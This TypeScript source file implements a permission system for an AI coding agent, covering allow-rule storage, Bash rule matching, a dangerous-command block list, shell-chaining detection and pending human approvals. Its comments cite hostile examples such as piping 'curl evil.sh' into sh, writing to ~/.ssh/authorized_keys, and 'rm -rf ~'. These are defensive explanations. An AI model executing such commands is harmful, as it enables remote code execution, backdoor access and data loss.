import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { randomUUID } from "node:crypto";
import { LOOM_START_TOOL } from "./loom-mcp";
// Imported as well as re-exported below: `ruleMatches` in this file calls
// inputPaths, and a bare `export { … } from` creates no local binding.
import {
  inputPaths,
  isProtectedPath,
  bashTouchesProtectedPath,
  makeGuardrailDecision,
} from "@telar/core";

// Claude Code-style permission rules, per project: "Write", "Edit",
// "Bash(bun test:*)" — a bare tool name allows the tool, a parenthesized
// specifier allows matching inputs only (":*" = prefix at a token/segment
// boundary, otherwise exact).
// `reason` distinguishes an affirmative user deny from an abort so callers
// don't misreport a non-answer as a refusal.
export type PermissionDecision = {
  behavior: "allow" | "deny";
  always?: boolean;
  reason?: "aborted" | "coalesced";
  // The specific rule to persist when `always` is set — one of the options
  // ruleOptionsFor offered for this tool call, validated by the route
  // (isOfferedRule) before it ever reaches here. Absent means "use the
  // caller's own default" — route.ts's canUseTool falls back to the prefix
  // rule (ruleFor's output) it minted the pending request with.
  rule?: string;
};

type PendingRequest = {
  project: string;
  rule: string;
  toolName: string;
  input: Record<string, unknown>;
  // The rule-choice options offered for this tool call (ruleOptionsFor's
  // output), remembered so POST /api/chat/permission can validate a
  // client-chosen `rule` against what was actually offered — never a wider,
  // client-injected string. Defaults to [] for callers (tests) that don't
  // pass any.
  ruleOptions: Array<{ rule: string; label: string }>;
  // Which session is waiting on this answer, when the caller knows (the
  // route's capturedSession is null before turn 1's init lands). Read by
  // sessionsAwaitingApproval() so the sidebar can say "needs you" — never
  // part of the resolution logic itself.
  sessionId?: string;
  resolve: (d: PermissionDecision) => void;
};

// globalThis so pendings survive Next dev HMR module reloads.
const g = globalThis as unknown as { __telarPending?: Map<string, PendingRequest> };
const pending = (g.__telarPending ??= new Map());

// Lazy so a test (or a reconfigured process) can point TELAR_HOME elsewhere.
//
// The trim+resolve guard matches core's manifest.ts telarDir() (full reasoning
// there): `??` falls back on null/undefined but NOT on "", and an
// exported-but-empty `TELAR_HOME=` is routine in shell scripts and CI. This is
// the module where an empty root does the most damage, measured rather than
// assumed — atomicWrite's mkdirSync(path.dirname("permissions.json")) resolves
// to "." and SUCCEEDS, so the allow-rules that gate the Human-Accept Moat are
// written to, and read back from, whatever the process's cwd happens to be. A
// moat rule accepted in one cwd is simply absent in another, with no error.
//
// DESIGN CALL on a RELATIVE root: path.resolve makes it absolute but still
// lands it under the cwd, and it pins NOTHING — this resolver is lazy, so
// path.resolve re-runs against the CURRENT cwd on every call and a process that
// chdir's mid-run reads and writes a different root afterwards (measured: with
// TELAR_HOME="rel-root", two calls straddling a process.chdir() returned two
// different absolute paths). Refusing a relative root outright is stronger, but
// it is a behavior change beyond this fix, so we resolve and document.
const telarHome = () => {
  const v = process.env.TELAR_HOME?.trim();
  return v ? path.resolve(v) : path.join(os.homedir(), ".telar");
};
const rulesFile = () => path.join(telarHome(), "permissions.json");

function atomicWrite(file: string, data: string) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const tmp = file + ".tmp";
  fs.writeFileSync(tmp, data);
  fs.renameSync(tmp, file);
}

function readAll(): Record<string, { allow: string[] }> {
  try {
    return JSON.parse(fs.readFileSync(rulesFile(), "utf8"));
  } catch {
    return {};
  }
}

export function readRules(project: string): string[] {
  return readAll()[project]?.allow ?? [];
}

export function addRule(project: string, rule: string): void {
  const all = readAll();
  const entry = (all[project] ??= { allow: [] });
  if (entry.allow.includes(rule)) return;
  entry.allow.push(rule);
  atomicWrite(rulesFile(), JSON.stringify(all, null, 2));
}

export function removeRule(project: string, rule: string): void {
  const all = readAll();
  const entry = all[project];
  if (!entry) return;
  entry.allow = entry.allow.filter((r) => r !== rule);
  atomicWrite(rulesFile(), JSON.stringify(all, null, 2));
}

// Leading "VAR=value" environment assignments (PORT=3100 bun run dev) don't
// name the command — skip them when picking what to group the rule by.
const ENV_ASSIGN = /^[A-Za-z_][A-Za-z0-9_]*=/;

// Command names for which a bare "Bash(<name>:*)" rule — i.e. "always allow
// any invocation of this command, with any args" — is never offered as a
// choice. These either grant broad system access on their own (sudo, sh,
// bash, zsh, eval, exec), are general-purpose command-execution wrappers
// that make "any args" equivalent to a bare shell (env, xargs, find (via
// -exec), timeout, nohup, nice, setsid, watch — all can invoke an arbitrary
// OTHER program with attacker-controlled args and no shell metacharacter, so
// SHELL_CHAIN never catches them), are commonly used to route around
// narrower rules (curl, wget, npx, bunx, node, python*, perl, ruby, php,
// lua, deno, which can run arbitrary fetched or interpreted code), or are
// destructive enough that "any args" is too wide (rm, rmdir, dd, mkfs,
// chmod, chown, kill, pkill).
export const DANGEROUS_COMMANDS: readonly string[] = [
  "rm",
  "rmdir",
  "sudo",
  "sh",
  "bash",
  "zsh",
  "eval",
  "exec",
  "env",
  "xargs",
  "find",
  "timeout",
  "nohup",
  "nice",
  "setsid",
  "watch",
  "dd",
  "mkfs",
  "chmod",
  "chown",
  "curl",
  "wget",
  "kill",
  "pkill",
  "npx",
  "bunx",
  "node",
  "python",
  "python3",
  "perl",
  "ruby",
  "php",
  "lua",
  "deno",
];

// The specifier for a rule derived from a tool call: for Bash, the command
// name plus its second raw token (if any); the bare tool name for everything
// else. The second token is folded in unconditionally — NOT only when it
// looks like a subcommand word (letters/dashes). Gating on that ("git log"
// folds, "-rf" or "/path" doesn't) sounds like it only affects generalization,
// but it means any command invoked with a flag, path, or quoted argument as
// its second token — i.e. almost every real invocation — collapses to a bare
// "Bash(<cmd>:*)" rule with NO argument constraint at all: approving a single
// scoped `rm -rf ./node_modules/.cache` would silently persist a rule that
// also matches `rm -rf ~`. Folding the raw second token always, like the
// pre-existing on-disk rule format, keeps the rule scoped to what was
// actually approved; it's narrower and "always allow" won't stick across
// differently-argued invocations, but that's the correct tradeoff.
export function ruleFor(toolName: string, input: Record<string, unknown>): string {
  if (toolName === "Bash" && typeof input.command === "string") {
    const tokens = input.command.trim().split(/\s+/).filter(Boolean);
    let i = 0;
    while (i < tokens.length && ENV_ASSIGN.test(tokens[i])) i++;
    const rest = tokens.slice(i);
    if (rest.length === 0) {
      // Empty command, or nothing but env assignments — there's no command
      // name to group by. A bare "Bash" rule would allow ANY command, so
      // fall back to the old exact-two-token grouping instead: narrow, but
      // safe.
      const head = tokens.slice(0, 2).join(" ");
      return `Bash(${head}:*)`;
    }
    const [name, second] = rest;
    const head = second ? `${name} ${second}` : name;
    return `Bash(${head}:*)`;
  }
  return toolName;
}

// Parse "Tool" | "Tool(spec)" without a strict char class so MCP tool names
// (mcp__x__y) and specs containing "(" survive.
function parseRule(rule: string): { tool: string; spec: string | null } | null {
  const open = rule.indexOf("(");
  if (open === -1) return rule ? { tool: rule, spec: null } : null;
  if (!rule.endsWith(")")) return null;
  return { tool: rule.slice(0, open), spec: rule.slice(open + 1, -1) };
}

// The choices offered to the user for "always allow" on a given tool call,
// ordered narrow -> broad. For Bash: the exact command typed, the ruleFor
// prefix (command + second raw token), and — unless the command name is in
// DANGEROUS_COMMANDS — a command-wide rule with no argument constraint at
// all. Non-Bash tools get a single bare-tool-name option; there's nothing
// narrower to offer since ruleFor/ruleMatches don't inspect non-Bash inputs.
export function ruleOptionsFor(
  toolName: string,
  input: Record<string, unknown>,
): Array<{ rule: string; label: string }> {
  if (toolName !== "Bash" || typeof input.command !== "string") {
    return [{ rule: toolName, label: `any '${toolName}' use` }];
  }
  const command = input.command;
  const options: Array<{ rule: string; label: string }> = [];

  // Exact spec is the raw (untrimmed) command, so it matches byte-for-byte
  // on re-invocation — ruleMatches compares the exact spec against the raw
  // input.command, not a trimmed copy.
  if (command.trim()) {
    options.push({ rule: `Bash(${command})`, label: "this exact command" });
  }

  const prefixRule = ruleFor(toolName, input);
  const parsedPrefix = parseRule(prefixRule);
  const head = parsedPrefix?.spec?.endsWith(":*") ? parsedPrefix.spec.slice(0, -2) : "";
  options.push({
    rule: prefixRule,
    label: head ? `any '${head}' command` : "any command",
  });

  const tokens = command.trim().split(/\s+/).filter(Boolean);
  let i = 0;
  while (i < tokens.length && ENV_ASSIGN.test(tokens[i])) i++;
  const name = tokens[i];
  if (name && !DANGEROUS_COMMANDS.includes(name)) {
    const wideRule = `Bash(${name}:*)`;
    // Single-word commands (no second token) already collapse to this same
    // rule via ruleFor — don't offer the identical choice twice.
    if (wideRule !== prefixRule) {
      options.push({ rule: wideRule, label: `any '${name}' command` });
    }
  }

  return options;
}

// Strict membership check the route uses to reject a client-injected rule
// that isn't one of the choices actually offered for this tool call — exact
// string equality only, no prefix/pattern matching.
export function isOfferedRule(options: Array<{ rule: string; label: string }>, rule: string): boolean {
  return options.some((o) => o.rule === rule);
}

// The client-selectable permission modes live in the SDK-free ./permission-modes
// module so "use client" components can import them at runtime — importing any
// runtime value from THIS file drags ./loom-mcp -> the Agent SDK
// (node:async_hooks) into the client bundle. Re-exported here so server call
// sites (route.ts) and permissions.test.ts keep a single import site.
export { PERMISSION_MODES, isValidPermissionMode, type ClientPermissionMode } from "./permission-modes";

// Shell separators/substitution/redirection that chain or divert a second
// command/target onto the first: ; & | ` newline, $( ), and < > (which also
// covers << heredocs and <( )/>( ) process substitution). A prefix rule like
// "bun test:*" must never match across one of these — otherwise "bun test &&
// curl evil.sh | sh" would be silently authorized by an "always allow" the
// user gave for "bun test". Redirection is included because a per-command
// rule like "Bash(cat:*)" would otherwise let `cat file > ~/.ssh/authorized_keys`
// through unprompted — no chain keyword needed, just an output target.
const SHELL_CHAIN = /[;&|`\n<>]|\$\(/;

// Mirror ruleFor's naming skip on the match side: drop leading VAR=value
// tokens so a rule minted from "PORT=3100 bun run dev" (named "bun run",
// per ruleFor) matches env-prefixed invocations, including its own creator.
// If EVERY token is an env assignment there's no command to skip to —
// ruleFor's degenerate fallback keeps the raw tokens in that case (see its
// "nothing but env assignments" branch), so mirror that here too instead of
// stripping down to an empty list.
function stripLeadingEnvAssignments(tokens: string[]): string[] {
  let i = 0;
  while (i < tokens.length && ENV_ASSIGN.test(tokens[i])) i++;
  return i < tokens.length ? tokens.slice(i) : tokens;
}

// Prefix match at a token boundary: "bun test" matches "bun test x" but not
// "bun tester", and never matches a command that chains on a second command
// via a shell separator (see SHELL_CHAIN). Tokenizing also absorbs
// incidental extra whitespace.
function tokenPrefix(prefix: string, target: string): boolean {
  if (SHELL_CHAIN.test(target)) return false;
  const p = prefix.trim().split(/\s+/).filter(Boolean);
  const t = stripLeadingEnvAssignments(target.trim().split(/\s+/).filter(Boolean));
  if (!p.length || t.length < p.length) return false;
  return p.every((tok, i) => t[i] === tok);
}

// Prefix match at a path-segment boundary: "src" matches "src/a.ts" but not
// "srcx". Segments are compared after normalization so "./" and trailing
// slashes don't matter.
function pathPrefix(prefix: string, target: string): boolean {
  const norm = (s: string) => s.replace(/\/+$/, "").split("/").filter((seg) => seg && seg !== ".");
  const p = norm(prefix);
  const t = norm(target);
  if (!p.length || t.length < p.length) return false;
  return p.every((seg, i) => t[i] === seg);
}

export function ruleMatches(rule: string, toolName: string, input: Record<string, unknown>): boolean {
  const parsed = parseRule(rule);
  if (!parsed || parsed.tool !== toolName) return false;
  if (parsed.spec === null) return true; // bare tool name → allow the tool
  const isCommand = typeof input.command === "string";
  const target = isCommand
    ? (input.command as string)
    : inputPaths(input)[0] ?? "";
  if (parsed.spec.endsWith(":*")) {
    const prefix = parsed.spec.slice(0, -2);
    if (!prefix) return false;
    return isCommand ? tokenPrefix(prefix, target) : pathPrefix(prefix, target);
  }
  return target === parsed.spec;
}

// THE GUARDRAIL PREDICATE NOW LIVES IN CORE, and this is the app-layer import
// path its callers already use. It moved because a module in apps/web is not
// reachable from `engine.ts`'s agent() or `ultra/runner.ts` — the two places
// that SPAWN — so a session turn enforced protectedPaths/disallowedTools while
// every child agent enforced neither. See packages/core/src/guardrails.ts.
//
// Re-exported rather than re-implemented: a second copy is how two enforcement
// points drift into one enforcement point and one decoration.
export { inputPaths, isProtectedPath, bashTouchesProtectedPath, makeGuardrailDecision };

// A PENDING REQUEST PARKS UNTIL SOMEONE DECIDES — there is no timer here, and
// that is the point (#28). This used to auto-deny after 120s, which meant a
// card the user hadn't scrolled to yet (or a queue of near-identical sub-agent
// cards) resolved itself to "deny" on the user's behalf. A non-answer is not a
// decision: the promise settles only via resolvePending — a user click, the
// SDK's own per-call abort signal, or the turn's fail-closed teardown
// (route.ts's finally), each of which is an event that actually happened.
export function createPending(
  project: string,
  toolName: string,
  input: Record<string, unknown>,
  rule: string,
  ruleOptions: Array<{ rule: string; label: string }> = [],
  sessionId?: string,
): { id: string; promise: Promise<PermissionDecision> } {
  let id = "perm_" + randomUUID();
  while (pending.has(id)) id = "perm_" + randomUUID(); // paranoia: randomUUID collisions are not realistic
  const promise = new Promise<PermissionDecision>((resolve) => {
    pending.set(id, {
      project,
      rule,
      toolName,
      input,
      ruleOptions,
      ...(sessionId ? { sessionId } : {}),
      resolve,
    });
  });
  return { id, promise };
}

// The sessions with at least one unanswered card, in one pass over the
// registry — /api/chats calls this once per request and tests membership per
// row, the same shape liveRunCountsBySession already takes for Ultra runs.
// A pending created before turn 1's init has no sessionId and is simply not
// attributable; it vanishes from this view, never misassigned.
export function sessionsAwaitingApproval(): Set<string> {
  const out = new Set<string>();
  for (const p of pending.values()) if (p.sessionId) out.add(p.sessionId);
  return out;
}

// Looked up by POST /api/chat/permission to validate a client-supplied
// `rule` against what was actually offered for this still-open request.
// undefined for an unknown or already-resolved id — the route treats that
// as "reject any rule" rather than trusting an unvalidatable choice.
export function pendingRuleOptions(id: string): Array<{ rule: string; label: string }> | undefined {
  return pending.get(id)?.ruleOptions;
}

export function resolvePending(id: string, decision: PermissionDecision): boolean {
  const p = pending.get(id);
  if (!p) return false;
  pending.delete(id);
  p.resolve(decision);
  // "Always allow" persists a rule that covers every other tool call already
  // waiting on the same project — resolve those too instead of making them
  // sit out the prompt for a rule the user just approved. The rule itself is
  // persisted by the caller of resolvePending
  // (route.ts, keyed off `decision.always`), not here.
  //
  // Critical: this must check the rule the user ACTUALLY picked
  // (decision.rule, falling back to this request's own default only when
  // they didn't pick a narrower one) against each sibling's OWN toolName/
  // input via ruleMatches — never just compare the two requests' stored
  // *default* `rule` labels for equality. That default is only a grouping
  // key (same command name + second token) computed once at createPending
  // time; it says nothing about what the user actually approved, and
  // skipping ruleMatches would also skip its SHELL_CHAIN check, so a
  // concurrently-pending sibling with a shell-chained/injected payload that
  // merely shares the same command-name grouping would get silently
  // auto-approved regardless of how narrow a rule the user chose.
  if (decision.behavior === "allow" && decision.always) {
    const persistedRule = decision.rule ?? p.rule;
    for (const [otherId, other] of pending) {
      // mcp__loom__start_loom is the loom moat's commit action (docs/
      // loom-model.md §M.6) and must NEVER be satisfiable by coalescing onto
      // someone else's "always allow" — every commit gets its own
      // interactive approval, no exceptions. addRule already refuses to
      // persist a rule for it (see route.ts's `toolName !== LOOM_START_TOOL`
      // guard), but that alone doesn't stop THIS sweep: a bare
      // "mcp__loom__start_loom" rule (the only option ruleOptionsFor offers
      // for a non-Bash tool) matches ANY start_loom input via ruleMatches'
      // `parsed.spec === null -> true` short-circuit, so without this
      // exemption a human approving one loom's start_loom card would
      // silently auto-approve every OTHER pending start_loom request in the
      // same project too.
      if (other.toolName === LOOM_START_TOOL) continue;
      if (other.project === p.project && ruleMatches(persistedRule, other.toolName, other.input)) {
        pending.delete(otherId);
        other.resolve({ behavior: "allow", reason: "coalesced" });
      }
    }
  }
  return true;
}
